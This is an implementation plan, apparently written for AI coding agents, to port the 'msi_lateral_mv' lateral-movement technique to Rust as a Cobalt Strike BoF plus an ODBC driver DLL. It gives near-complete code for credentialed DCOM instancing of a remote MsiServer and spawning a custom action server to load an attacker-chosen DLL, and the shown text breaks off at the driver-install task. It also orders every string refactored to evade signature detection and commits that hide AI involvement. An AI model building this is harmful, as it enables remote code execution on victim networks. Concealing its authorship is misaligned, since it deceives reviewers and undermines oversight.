# letmove_msi Rust BoF + Driver Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Port `werdhaihai/msi_lateral_mv` — both the C BoF and the sample driver DLL — to Rust. BoF is `no_std`, built on `rustbof`, produces `letmove_msi.o` for Cobalt Strike. Driver is a Rust `cdylib` (`odbcpivot.dll`) exporting `ConfigDriver`. All operator-visible strings, log lines, artifact names, and internal module names are refactored so nothing byte-matches the upstream repo.

**Architecture:** Cargo workspace `letmove_msi_ws/` with two members: `bof/` (staticlib, linked to COFF via `boflink`) and `driver/` (cdylib). BoF uses raw `#[repr(C)]` COM vtables against `IMsiServer` / `IMsiConfigurationManager::CreateCustomActionServer` / `IMsiCustomAction::SQLInstallDriverEx` over DCOM. Driver logs execution context (username/SID/elevation/session/PID/integrity) to a compile-time-configurable path via raw `CreateFileW`/`WriteFile` — no CRT, no `stdio`.

**Tech Stack:** Rust nightly, `rustbof`, `windows-sys` 0.59, `boflink`, `cargo-make`. Driver cross-compiles from Linux/macOS via `x86_64-pc-windows-gnu`.

## Global Constraints

- BoF: `no_std`, `crate-type = ["staticlib"]`, nightly, `panic = abort`, LTO, `opt-level = "z"`.
- Driver: `no_std` if practical (otherwise `std` on the `pc-windows-gnu` target), `crate-type = ["cdylib"]`, `panic = "abort"`.
- Reference source (already cloned at repo root): `msi_lateral_mv/bof/*.c`, `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp`. GUIDs, vtable slot ordering, and function-slot padding **must** be copied verbatim from those files — technique parity requires it.
- **String refactor:** NO operator-visible / on-disk string in either crate may match text from the upstream `msi_lateral_mv` repository, except: Win32 API names, GUIDs, `ConfigDriver` export name, and the argv tokens `"local"`/`"remote"`. Use the string table in §String Refactor below.
- Command / output artifact name: **`letmove_msi.o`** (BoF), **`odbcpivot.dll`** (driver).
- Commits authored as `daniagungg <daniagungg@gmail.com>`; commit messages MUST NOT mention Claude, AI, or any assistant.

## String Refactor — Mapping Table

Use these substitutions everywhere the upstream C would have printed / written the LHS. When printing a value, prefer key=value form (`sub=alice`) over labelled English.

BoF messages:

| Upstream C (do NOT reuse) | Rust equivalent (use) |
|---|---|
| `[+] Attempting lateral movement to %ls as %ls\%ls` | `>> pivot host=%ls principal=%ls\%ls` |
| `[+] Attempting local execution as %ls\%ls` | `>> local principal=%ls\%ls` |
| `[-] CLSCTX: LOCAL` | `ctx=local` |
| `[-] CLSCTX: REMOTE (%ls)` | `ctx=remote target=%ls` |
| `[-] Calling CoCreateInstanceEx on remote server: %ls` | `stage1: instancing on %ls` |
| `[-] Calling CoCreateInstanceEx on local server` | `stage1: instancing locally` |
| `[!] CoInitializeSecurity Failed with: 0x%08X` | `sec-init rc=0x%08X` |
| `[!] CoCreateInstanceEx Failed with: 0x%08X` | `stage1 rc=0x%08X` |
| `[!] QueryInterface for IMsiServer failed: 0x%08X` | `qi.a rc=0x%08X` |
| `[+] Got pointer to MsiServer interface at: %p` | `stage1 ok @%p` |
| `[-] Calling SetupAuthOnParentIUnknownCastToIID` | `applying blanket` |
| `[!] Failed to create IMsiRemoteAPI interface` | `remapi failed` |
| `[!] ERROR: 0x%08X Calling CreateCustomActionServer` | `stage2 rc=0x%08X` |
| `[!] SetupAuthOnParentIUnknownCastToIID for IMsiCustomAction Failed` | `qi.b failed` |
| `[+] Authenticated MSI server @ %p` | `stage1 auth ok @%p` |
| `[-] DLL Path is %ls` | `payload.dir=%ls` |
| `[-] DLL Filename is %ls` | `payload.file=%ls` |
| `[-] Calling SQLInstallDriverEx` | `stage3a` |
| `SQLInstallDriverEx failed. HRESULT: 0x%x, ReturnCode: %d` | `stage3a rc=0x%x code=%d` |
| `Error message: %s` | `err=%s` |
| `[$] Driver installed successfully. Usage count: %d` | `stage3a ok refs=%d` |
| `[-] Driver path: %ls` | `stage3a.path=%ls` |
| `[-] Calling SQLConfigDriver` | `stage3b` |
| `[!] SQLConfigDriver failed. HRESULT: 0x%x` | `stage3b rc=0x%x` |
| `[!] Error message: %s` | `stage3b.err=%s` |
| `[LFG] Driver configured successfully` | `stage3b ok` |
| `Usage: msi_lateral_mv ...` | `usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>` |

Driver messages (upstream `sqldriverdll/TestDriver/dllmain.cpp`):

| Upstream | Rust equivalent |
|---|---|
| Log path `C:\Users\domainadmin\Desktop\MSI_Output.log` | `%PROGRAMDATA%\odbcpivot.dat` (override via `ODBCPIVOT_LOG` env var at compile time) |
| `ConfigDriver Called` | `hit ts=%s` |
| `Username: %s` | `sub=%s` |
| `User SID: %s` | `sid=%s` |
| `Token Elevated: %s` | `elev=%s` |
| `Logon Session ID: %08X-%08X` | `sess=%08X%08X` |
| `Process ID: %d` | `pid=%d` |
| `Integrity Level: %s (%08X)` | `il=%s(%08X)` |
| `High` / `Medium` / `Low` / `Untrusted` / `Unknown` | `hi` / `med` / `lo` / `unt` / `?` |

Module names: use `argv`, `vtbl`, `secure`, `stage`, `deploy` (BoF) — NOT `args`, `com`, `auth`, `msi`, `install`. Do not use `msilat`, `comstuff`, or `TestDriver` anywhere.

---

### Task 1: Scaffold the workspace + BoF crate

**Files:**
- Create: `letmove_msi_ws/Cargo.toml`
- Create: `letmove_msi_ws/rust-toolchain.toml`
- Create: `letmove_msi_ws/.gitignore`
- Create: `letmove_msi_ws/bof/Cargo.toml`
- Create: `letmove_msi_ws/bof/Makefile.toml`
- Create: `letmove_msi_ws/bof/src/lib.rs`

**Interfaces:**
- Consumes: nothing.
- Produces: a buildable rustbof project whose `main` is empty. Downstream tasks add modules and fill `main`.

- [ ] **Step 1: Workspace `Cargo.toml`**

```toml
[workspace]
resolver = "2"
members  = ["bof", "driver"]
```

- [ ] **Step 2: `rust-toolchain.toml`**

```toml
[toolchain]
channel = "nightly"
components = ["rust-src"]
targets = ["x86_64-pc-windows-gnu"]
```

- [ ] **Step 3: `.gitignore`**

```
target/
Cargo.lock
```

- [ ] **Step 4: `bof/Cargo.toml`**

```toml
[package]
name = "letmove_msi"
version = "0.1.0"
edition = "2024"
authors = ["daniagungg"]
publish = false

[lib]
crate-type = ["staticlib"]

[dependencies.rustbof]
git = "https://github.com/joaoviictorti/rustbof"

[dependencies.windows-sys]
version = "0.59"
features = [
    "Win32_Foundation",
    "Win32_System_Com",
    "Win32_System_Ole",
    "Win32_System_Rpc",
    "Win32_System_LibraryLoader",
    "Win32_System_Environment",
    "Win32_Security_Authentication_Identity",
    "Win32_UI_Shell",
]

[profile.release]
opt-level = "z"
codegen-units = 1
panic = "abort"
strip = true
lto = true
```

- [ ] **Step 5: `bof/Makefile.toml`**

Copy from `rustbof/examples/whoami/Makefile.toml`. Then, in the copied content, replace any `whoami` reference with `letmove_msi`. Read the source first:

```bash
cat rustbof/examples/whoami/Makefile.toml
```

- [ ] **Step 6: `bof/src/lib.rs`**

```rust
#![no_std]

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
}
```

- [ ] **Step 7: Build**

```bash
cd letmove_msi_ws/bof && cargo make
find target -name 'letmove_msi.o'
```
Expected: build succeeds; the `.o` file exists.

- [ ] **Step 8: Commit**

```bash
git add letmove_msi_ws/
git commit -m "feat: scaffold letmove_msi cargo workspace and BoF crate"
```

---

### Task 2: COM vtable + GUID module (`vtbl.rs`)

**Files:**
- Create: `letmove_msi_ws/bof/src/vtbl.rs`
- Modify: `letmove_msi_ws/bof/src/lib.rs` (add `mod vtbl;`)
- Reference (read only): `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/bof/bofdefs.h`.

**Interfaces:**
- Consumes: nothing.
- Produces (all `pub`):
  - `const CLSID_MsiServer, IID_IMsiServer, CLSID_MSIRemoteApi, IID_IMsiRemoteAPI, IID_IMsiCustomAction, IID_IClassFactory: GUID`
  - `const ICAC64_IMPERSONATED: u32`
  - `struct IUnknownVtbl { QueryInterface, AddRef, Release }`, `struct IUnknown { lpVtbl: *const IUnknownVtbl }`
  - `struct IClassFactoryVtbl { base: IUnknownVtbl, CreateInstance, LockServer }`, `struct IClassFactory { lpVtbl: *const IClassFactoryVtbl }`
  - `struct IMsiConfigurationManagerVtbl { base: IUnknownVtbl, /* reserved slots to correct offset */, CreateCustomActionServer }`, `struct IMsiConfigurationManager`
  - `struct IMsiCustomActionVtbl { base: IUnknownVtbl, /* reserved slots */, SQLInstallDriverEx, SQLConfigDriver, SQLInstallerError }`, `struct IMsiCustomAction`

Any vtable slot the Rust code does not call must still be reserved as `*const c_void` in the correct position to preserve the offset from the C header. Off-by-one here is a crash at call time.

- [ ] **Step 1: Extract the ground truth**

```bash
cat msi_lateral_mv/bof/msilat.h
cat msi_lateral_mv/bof/bofdefs.h
```

Transcribe every `DEFINE_GUID` and every vtable declaration. Especially: relative slot positions of `CreateCustomActionServer` inside `IMsiConfigurationManagerVtbl`, and of `SQLInstallDriverEx`/`SQLConfigDriver`/`SQLInstallerError` inside `IMsiCustomActionVtbl`.

- [ ] **Step 2: Write `bof/src/vtbl.rs`**

```rust
use core::ffi::c_void;
use windows_sys::core::{GUID, HRESULT};

// GUIDs — copy each u128 from msilat.h exactly.
pub const CLSID_MsiServer:      GUID = GUID::from_u128(0x_/* fill */);
pub const IID_IMsiServer:       GUID = GUID::from_u128(0x_/* fill */);
pub const CLSID_MSIRemoteApi:   GUID = GUID::from_u128(0x_/* fill */);
pub const IID_IMsiRemoteAPI:    GUID = GUID::from_u128(0x_/* fill */);
pub const IID_IMsiCustomAction: GUID = GUID::from_u128(0x_/* fill */);
pub const IID_IClassFactory:    GUID = GUID::from_u128(0x00000001_0000_0000_C000_000000000046);

pub const ICAC64_IMPERSONATED: u32 = /* fill from msilat.h */;

#[repr(C)]
pub struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut IUnknown, *const GUID, *mut *mut c_void) -> HRESULT,
    pub AddRef:         unsafe extern "system" fn(*mut IUnknown) -> u32,
    pub Release:        unsafe extern "system" fn(*mut IUnknown) -> u32,
}
#[repr(C)] pub struct IUnknown { pub lpVtbl: *const IUnknownVtbl }

#[repr(C)]
pub struct IClassFactoryVtbl {
    pub base: IUnknownVtbl,
    pub CreateInstance: unsafe extern "system" fn(*mut IClassFactory, *mut IUnknown, *const GUID, *mut *mut c_void) -> HRESULT,
    pub LockServer:     unsafe extern "system" fn(*mut IClassFactory, i32) -> HRESULT,
}
#[repr(C)] pub struct IClassFactory { pub lpVtbl: *const IClassFactoryVtbl }

#[repr(C)]
pub struct IMsiConfigurationManagerVtbl {
    pub base: IUnknownVtbl,
    // <fill: any reserved *const c_void slots preceding CreateCustomActionServer>
    pub CreateCustomActionServer: unsafe extern "system" fn(
        this: *mut IMsiConfigurationManager,
        iContext: u32,
        clientProcessId: u32,
        pRemApi: *mut IUnknown,
        pvEnvironment: *const u16,
        cbEnvironment: u32,
        dwUnknown: u32,
        rgchCookie: *mut u8,
        pcCookie: *mut i32,
        ppMsiCustomAction: *mut *mut IMsiCustomAction,
        pdwServerPid: *mut u32,
        bUnknownFalse: i32,
    ) -> HRESULT,
    // <fill: any trailing reserved slots>
}
#[repr(C)] pub struct IMsiConfigurationManager { pub lpVtbl: *const IMsiConfigurationManagerVtbl }

#[repr(C)]
pub struct IMsiCustomActionVtbl {
    pub base: IUnknownVtbl,
    // <fill: reserved slots preceding SQLInstallDriverEx>
    pub SQLInstallDriverEx: unsafe extern "system" fn(
        this: *mut IMsiCustomAction, cDrvLen: i32, szDriver: *const u16,
        szPathIn: *const u16, szPathOut: *mut u16, cbPathOutMax: u16,
        pcbPathOut: *mut u16, fRequest: u16, pdwUsageCount: *mut u32,
        rawReturnCode: *mut i32,
    ) -> HRESULT,
    pub SQLConfigDriver: unsafe extern "system" fn(
        this: *mut IMsiCustomAction, fRequest: u16, szDriver: *const u16,
        szArgs: *const u16, szMsg: *mut u16, cbMsgMax: u16,
        pcbMsgOut: *mut u16, configResult: *mut i32,
    ) -> HRESULT,
    pub SQLInstallerError: unsafe extern "system" fn(
        this: *mut IMsiCustomAction, iError: u16, pfErrorCode: *mut u32,
        szErrorMsg: *mut u16, cbErrorMsgMax: u16, pcbErrorMsg: *mut u16,
    ) -> HRESULT,
    // <fill: any trailing reserved slots>
}
#[repr(C)] pub struct IMsiCustomAction { pub lpVtbl: *const IMsiCustomActionVtbl }
```

Resolve every `<fill: ...>` marker against `msilat.h` — the file must not contain those markers when done.

- [ ] **Step 3: Wire module**

```rust
#![no_std]

mod vtbl;

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {}
```

- [ ] **Step 4: Build**

`cd letmove_msi_ws/bof && cargo make` → expect success.

- [ ] **Step 5: Commit**

```bash
git add letmove_msi_ws/bof/src/vtbl.rs letmove_msi_ws/bof/src/lib.rs
git commit -m "feat(vtbl): add MSI COM vtables and GUID constants"
```

---

### Task 3: Argument parsing (`argv.rs`)

**Files:**
- Create: `letmove_msi_ws/bof/src/argv.rs`
- Modify: `letmove_msi_ws/bof/src/lib.rs`

**Interfaces:**
- Consumes: `rustbof::data::DataParser`.
- Produces:
  - `pub enum Mode { Local, Remote }`
  - `pub struct Args { pub mode: Mode, pub host: Option<*const u16>, pub domain: Option<*const u16>, pub user: Option<*const u16>, pub pass: Option<*const u16>, pub driver: *const u16, pub dll: *const u16 }`
  - `pub fn parse(args: *mut u8, len: usize) -> Option<Args>`
  - `pub fn print_usage()`

Wire protocol (7 length-prefixed wide strings in this order — empty string = absent): `mode`, `host`, `domain`, `user`, `pass`, `driver`, `dll`. Tokens `local`/`remote` for `mode` are the ONE upstream string we keep (operator protocol).

- [ ] **Step 1: Verify `DataParser::get_wstr()` signature**

```bash
grep -n "pub fn get_" rustbof/crates/rustbof/src/data.rs
```
If the return type differs from `*const u16`, adapt the module below — but keep the `Args` field names and types exactly as promised in Interfaces.

- [ ] **Step 2: Write `bof/src/argv.rs`**

```rust
use rustbof::data::DataParser;
use rustbof::eprintln;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Mode { Local, Remote }

pub struct Args {
    pub mode:   Mode,
    pub host:   Option<*const u16>,
    pub domain: Option<*const u16>,
    pub user:   Option<*const u16>,
    pub pass:   Option<*const u16>,
    pub driver: *const u16,
    pub dll:    *const u16,
}

fn opt(p: *const u16) -> Option<*const u16> {
    if p.is_null() { return None; }
    unsafe { if *p == 0 { None } else { Some(p) } }
}

fn ascii_eq(mut w: *const u16, s: &[u8]) -> bool {
    if w.is_null() { return false; }
    unsafe {
        for &c in s {
            if *w as u8 != c { return false; }
            w = w.add(1);
        }
        *w == 0
    }
}

pub fn print_usage() {
    eprintln!("usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>");
    eprintln!("  pass empty string \"\" for absent host/domain/user/pass");
}

pub fn parse(args: *mut u8, len: usize) -> Option<Args> {
    let mut p = DataParser::new(args, len);
    let mode_s = p.get_wstr();
    let host   = p.get_wstr();
    let domain = p.get_wstr();
    let user   = p.get_wstr();
    let pass   = p.get_wstr();
    let driver = p.get_wstr();
    let dll    = p.get_wstr();

    let mode = if ascii_eq(mode_s, b"local") { Mode::Local }
               else if ascii_eq(mode_s, b"remote") { Mode::Remote }
               else { print_usage(); return None; };

    if driver.is_null() || unsafe { *driver } == 0 { print_usage(); return None; }
    if dll.is_null()    || unsafe { *dll }    == 0 { print_usage(); return None; }
    if mode == Mode::Remote && opt(host).is_none() {
        eprintln!("target required for remote"); return None;
    }
    let has_u = opt(user).is_some();
    let has_p = opt(pass).is_some();
    if has_u != has_p { eprintln!("principal requires user and pass together"); return None; }
    if opt(domain).is_some() && !has_u { eprintln!("realm requires principal"); return None; }

    Some(Args {
        mode,
        host: opt(host), domain: opt(domain), user: opt(user), pass: opt(pass),
        driver, dll,
    })
}
```

- [ ] **Step 3: Wire `lib.rs`**

```rust
#![no_std]

mod argv;
mod vtbl;

use rustbof::println;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = argv::parse(raw, len) else { return };
    let m = match a.mode { argv::Mode::Local => "local", argv::Mode::Remote => "remote" };
    println!("argv ok mode={}", m);
    let _ = a;
}
```

- [ ] **Step 4: Build**

`cd letmove_msi_ws/bof && cargo make` → success.

- [ ] **Step 5: Commit**

```bash
git add letmove_msi_ws/bof/src/argv.rs letmove_msi_ws/bof/src/lib.rs
git commit -m "feat(argv): parse wide-string wire-protocol arguments"
```

---

### Task 4: Auth builder (`secure.rs`)

**Files:**
- Create: `letmove_msi_ws/bof/src/secure.rs`
- Modify: `letmove_msi_ws/bof/src/lib.rs`
- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` fn `set_auth`; `msi_lateral_mv/bof/comstuff.c`.

**Interfaces:**
- Produces:
  - `#[repr(C)] pub struct AuthBundle { pub auth_info: COAUTHINFO, pub auth_id: COAUTHIDENTITY, pub has_ident: bool }`
  - `pub fn build(domain, user, pass) -> AuthBundle`
  - `pub unsafe fn init_com_security(&AuthBundle) -> HRESULT`
  - `pub unsafe fn apply_blanket(parent: *mut IUnknown, &AuthBundle, iid: *const GUID) -> Result<*mut IUnknown, HRESULT>`

Values (exact, from C): `dwAuthnSvc=RPC_C_AUTHN_WINNT`, `dwAuthzSvc=RPC_C_AUTHZ_NONE`, `dwAuthnLevel=RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`, `dwImpersonationLevel=RPC_C_IMP_LEVEL_IMPERSONATE`, `Flags=SEC_WINNT_AUTH_IDENTITY_UNICODE`, `dwCapabilities=EOAC_NONE`.

- [ ] **Step 1: Read C references**

```bash
sed -n '9,52p' msi_lateral_mv/bof/msi_lateral_mv.c
cat msi_lateral_mv/bof/comstuff.c
```

- [ ] **Step 2: Write `bof/src/secure.rs`**

```rust
use core::ptr::{null, null_mut};
use windows_sys::core::{GUID, HRESULT};
use windows_sys::Win32::System::Com::{
    CoInitializeSecurity, CoSetProxyBlanket, COAUTHIDENTITY, COAUTHINFO,
    EOAC_DEFAULT, EOAC_NONE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
    RPC_C_IMP_LEVEL_IMPERSONATE, SOLE_AUTHENTICATION_INFO,
    SOLE_AUTHENTICATION_LIST,
};
use windows_sys::Win32::System::Rpc::{RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE};
use windows_sys::Win32::Security::Authentication::Identity::SEC_WINNT_AUTH_IDENTITY_UNICODE;

use crate::vtbl::IUnknown;

#[repr(C)]
pub struct AuthBundle {
    pub auth_info: COAUTHINFO,
    pub auth_id:   COAUTHIDENTITY,
    pub has_ident: bool,
}

unsafe fn wlen(mut p: *const u16) -> u32 {
    if p.is_null() { return 0; }
    let mut n = 0u32;
    while *p != 0 { n += 1; p = p.add(1); }
    n
}

pub fn build(
    domain: Option<*const u16>,
    user:   Option<*const u16>,
    pass:   Option<*const u16>,
) -> AuthBundle {
    let mut b: AuthBundle = unsafe { core::mem::zeroed() };
    if let Some(u) = user {
        unsafe {
            b.auth_id.User = u as *mut u16;
            b.auth_id.UserLength = wlen(u);
            if let Some(p) = pass {
                b.auth_id.Password = p as *mut u16;
                b.auth_id.PasswordLength = wlen(p);
            }
            if let Some(d) = domain {
                b.auth_id.Domain = d as *mut u16;
                b.auth_id.DomainLength = wlen(d);
            }
            b.auth_id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
            b.has_ident = true;
        }
    }
    b.auth_info.dwAuthnSvc           = RPC_C_AUTHN_WINNT as u32;
    b.auth_info.dwAuthzSvc           = RPC_C_AUTHZ_NONE as u32;
    b.auth_info.pwszServerPrincName  = null_mut();
    b.auth_info.dwAuthnLevel         = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY as u32;
    b.auth_info.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE as u32;
    b.auth_info.pAuthIdentityData    = if b.has_ident {
        &b.auth_id as *const _ as *mut _
    } else { null_mut() };
    b.auth_info.dwCapabilities       = EOAC_NONE as u32;
    b
}

pub unsafe fn init_com_security(b: &AuthBundle) -> HRESULT {
    let mut sai: SOLE_AUTHENTICATION_INFO = core::mem::zeroed();
    sai.dwAuthnSvc = b.auth_info.dwAuthnSvc;
    sai.dwAuthzSvc = b.auth_info.dwAuthzSvc;
    sai.pAuthInfo  = b.auth_info.pAuthIdentityData as *mut _;
    let sal = SOLE_AUTHENTICATION_LIST { cAuthInfo: 1, aAuthInfo: &sai as *const _ as *mut _ };
    CoInitializeSecurity(
        null(), -1, null_mut(), null_mut(),
        b.auth_info.dwAuthnLevel, b.auth_info.dwImpersonationLevel,
        &sal as *const _ as *mut _, EOAC_NONE as u32, null_mut(),
    )
}

pub unsafe fn apply_blanket(
    parent: *mut IUnknown, b: &AuthBundle, iid: *const GUID,
) -> Result<*mut IUnknown, HRESULT> {
    let mut out: *mut IUnknown = null_mut();
    let hr = ((*(*parent).lpVtbl).QueryInterface)(parent, iid, &mut out as *mut _ as *mut _);
    if hr < 0 || out.is_null() { return Err(hr); }
    let hr = CoSetProxyBlanket(
        out as *mut _,
        RPC_C_AUTHN_WINNT as u32, RPC_C_AUTHZ_NONE as u32, null_mut(),
        b.auth_info.dwAuthnLevel, b.auth_info.dwImpersonationLevel,
        b.auth_info.pAuthIdentityData as *mut _, EOAC_DEFAULT as u32,
    );
    if hr < 0 { ((*(*out).lpVtbl).Release)(out); return Err(hr); }
    Ok(out)
}
```

- [ ] **Step 3: Wire `lib.rs`**

Add `mod secure;` beside the other modules.

- [ ] **Step 4: Build**

`cd letmove_msi_ws/bof && cargo make` → success.

- [ ] **Step 5: Commit**

```bash
git add letmove_msi_ws/bof/src/secure.rs letmove_msi_ws/bof/src/lib.rs
git commit -m "feat(secure): build COAUTHINFO and proxy blanket helpers"
```

---

### Task 5: MsiServer bring-up + CustomActionServer (`stage.rs`)

**Files:**
- Create: `letmove_msi_ws/bof/src/stage.rs`
- Modify: `letmove_msi_ws/bof/src/lib.rs`
- Reference (read only): `msi_lateral_mv/bof/msilat.c`, `msi_lateral_mv/bof/utils.c`.

**Interfaces:**
- Produces:
  - `pub unsafe fn open_server(bundle: &AuthBundle, host: Option<*const u16>) -> Result<*mut IUnknown, HRESULT>` — was `auth_msi_server`.
  - `pub unsafe fn spawn_action(server: *mut IUnknown, bundle: &AuthBundle) -> Result<*mut IMsiCustomAction, HRESULT>` — was `get_custom_action_server`.

- [ ] **Step 1: Read C references**

```bash
sed -n '11,158p' msi_lateral_mv/bof/msilat.c
cat msi_lateral_mv/bof/utils.c
```

- [ ] **Step 2: Write `bof/src/stage.rs`**

```rust
use core::ffi::c_void;
use core::ptr::{null, null_mut};
use windows_sys::core::{GUID, HRESULT, PCSTR};
use windows_sys::Win32::Foundation::{FALSE, HMODULE};
use windows_sys::Win32::System::Com::{
    CoCreateInstanceEx, CoInitialize, CLSCTX_LOCAL_SERVER, CLSCTX_REMOTE_SERVER,
    COSERVERINFO, MULTI_QI,
};
use windows_sys::Win32::System::Environment::{FreeEnvironmentStringsW, GetEnvironmentStringsW};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use rustbof::{eprintln, println};

use crate::secure::{self, AuthBundle};
use crate::vtbl::{
    IClassFactory, IMsiConfigurationManager, IMsiCustomAction, IUnknown,
    CLSID_MsiServer, CLSID_MSIRemoteApi, ICAC64_IMPERSONATED,
    IID_IClassFactory, IID_IMsiCustomAction, IID_IMsiRemoteAPI, IID_IMsiServer,
};

const COOKIE: usize = 32;

type DllGetClassObjectFn = unsafe extern "system" fn(
    *const GUID, *const GUID, *mut *mut c_void,
) -> HRESULT;

pub unsafe fn open_server(
    b: &AuthBundle, host: Option<*const u16>,
) -> Result<*mut IUnknown, HRESULT> {
    let ctx = if host.is_some() { CLSCTX_REMOTE_SERVER } else { CLSCTX_LOCAL_SERVER };
    match host {
        Some(h) => println!("ctx=remote target=@{:p}", h),
        None    => println!("ctx=local"),
    }

    let hr = CoInitialize(null());
    if hr < 0 { eprintln!("com-init rc=0x{:08X}", hr as u32); }

    let hr = secure::init_com_security(b);
    if hr < 0 { eprintln!("sec-init rc=0x{:08X}", hr as u32); return Err(hr); }

    let mut server_info: COSERVERINFO = core::mem::zeroed();
    let p_server_info: *mut COSERVERINFO = if let Some(h) = host {
        server_info.pwszName  = h as *mut u16;
        server_info.pAuthInfo = &b.auth_info as *const _ as *mut _;
        &mut server_info
    } else { null_mut() };

    let mut qi: MULTI_QI = core::mem::zeroed();
    qi.pIID = &IID_IMsiServer;

    match host { Some(h) => println!("stage1: instancing on @{:p}", h), None => println!("stage1: instancing locally") };
    let hr = CoCreateInstanceEx(&CLSID_MsiServer, null_mut(), ctx as u32, p_server_info, 1, &mut qi);
    if hr < 0 { eprintln!("stage1 rc=0x{:08X}", hr as u32); return Err(hr); }
    if qi.hr < 0 { eprintln!("qi.a rc=0x{:08X}", qi.hr as u32); return Err(qi.hr); }
    let srv = qi.pItf as *mut IUnknown;
    println!("stage1 ok @{:p}", srv);

    if host.is_some() {
        println!("applying blanket");
        let out = secure::apply_blanket(srv, b, &IID_IMsiServer);
        ((*(*srv).lpVtbl).Release)(srv);
        out
    } else {
        ((*(*srv).lpVtbl).AddRef)(srv);
        let out = srv;
        ((*(*srv).lpVtbl).Release)(srv);
        Ok(out)
    }
}

unsafe fn env_bytes(mut p: *const u16) -> u32 {
    if p.is_null() { return 0; }
    let start = p;
    loop { if *p == 0 && *p.add(1) == 0 { break; } p = p.add(1); }
    ((p.offset_from(start) as u32) + 2) * 2
}

unsafe fn factory_object(hmod: HMODULE, clsid: *const GUID, iid: *const GUID) -> *mut IUnknown {
    if hmod.is_null() { return null_mut(); }
    let proc = GetProcAddress(hmod, b"DllGetClassObject\0".as_ptr() as PCSTR);
    let Some(proc) = proc else { return null_mut(); };
    let get: DllGetClassObjectFn = core::mem::transmute(proc);
    let mut fac: *mut IClassFactory = null_mut();
    let hr = get(clsid, &IID_IClassFactory, &mut fac as *mut _ as *mut _);
    if hr < 0 || fac.is_null() { return null_mut(); }
    let mut obj: *mut IUnknown = null_mut();
    let hr = ((*(*fac).lpVtbl).CreateInstance)(fac, null_mut(), iid, &mut obj as *mut _ as *mut _);
    ((*(*fac).lpVtbl).base.Release)(fac as *mut IUnknown);
    if hr < 0 { return null_mut(); }
    obj
}

pub unsafe fn spawn_action(
    server: *mut IUnknown, b: &AuthBundle,
) -> Result<*mut IMsiCustomAction, HRESULT> {
    let hmsi = LoadLibraryW([b'm' as u16, b's' as u16, b'i' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0].as_ptr());
    if hmsi.is_null() { eprintln!("msi.dll load fail"); return Err(-1); }

    let rem = factory_object(hmsi, &CLSID_MSIRemoteApi, &IID_IMsiRemoteAPI);
    if rem.is_null() { eprintln!("remapi failed"); return Err(-1); }

    let env = GetEnvironmentStringsW();
    let env_sz = env_bytes(env);
    let mut cookie = [0u8; COOKIE];
    let mut cookie_sz: i32 = COOKIE as i32;
    let mut action: *mut IMsiCustomAction = null_mut();
    let mut pid: u32 = 0;

    let cfg = server as *mut IMsiConfigurationManager;
    let hr = ((*(*cfg).lpVtbl).CreateCustomActionServer)(
        cfg, ICAC64_IMPERSONATED, 4, rem, env, env_sz, 0,
        cookie.as_mut_ptr(), &mut cookie_sz, &mut action, &mut pid, FALSE,
    );
    FreeEnvironmentStringsW(env);

    if action.is_null() {
        eprintln!("stage2 rc=0x{:08X}", hr as u32);
        ((*(*rem).lpVtbl).Release)(rem);
        return Err(hr);
    }

    let authed = match secure::apply_blanket(action as *mut IUnknown, b, &IID_IMsiCustomAction) {
        Ok(p) => p as *mut IMsiCustomAction,
        Err(e) => {
            eprintln!("qi.b failed rc=0x{:08X}", e as u32);
            ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
            ((*(*rem).lpVtbl).Release)(rem);
            return Err(e);
        }
    };
    ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
    ((*(*rem).lpVtbl).Release)(rem);
    Ok(authed)
}
```

- [ ] **Step 3: Wire main**

```rust
#![no_std]

mod argv;
mod secure;
mod stage;
mod vtbl;

use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::CoUninitialize;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = argv::parse(raw, len) else { return };
    let bundle = secure::build(a.domain, a.user, a.pass);
    unsafe {
        let srv = match stage::open_server(&bundle, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("stage1 rc=0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        println!("stage1 auth ok @{:p}", srv);
        let act = match stage::spawn_action(srv, &bundle) {
            Ok(p) => p,
            Err(hr) => {
                eprintln!("stage2 rc=0x{:08X}", hr as u32);
                ((*(*srv).lpVtbl).Release)(srv); CoUninitialize(); return;
            }
        };
        println!("stage2 ok @{:p}", act);
        ((*(*act).lpVtbl).base.Release)(act as *mut vtbl::IUnknown);
        ((*(*srv).lpVtbl).Release)(srv);
        CoUninitialize();
    }
}
```

- [ ] **Step 4: Build**

`cd letmove_msi_ws/bof && cargo make` → success.

- [ ] **Step 5: Commit**

```bash
git add letmove_msi_ws/bof/src/stage.rs letmove_msi_ws/bof/src/lib.rs
git commit -m "feat(stage): authenticate MsiServer and spawn action server"
```

---

### Task 6: Driver install + config (`deploy.rs`)

**Files:**
- Create: `letmove_msi_ws/bof/src/deploy.rs`
- Modify: `letmove_msi_ws/bof/src/lib.rs`
- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (driver-info block build + SQL* calls).

**Interfaces:**
- Produces:
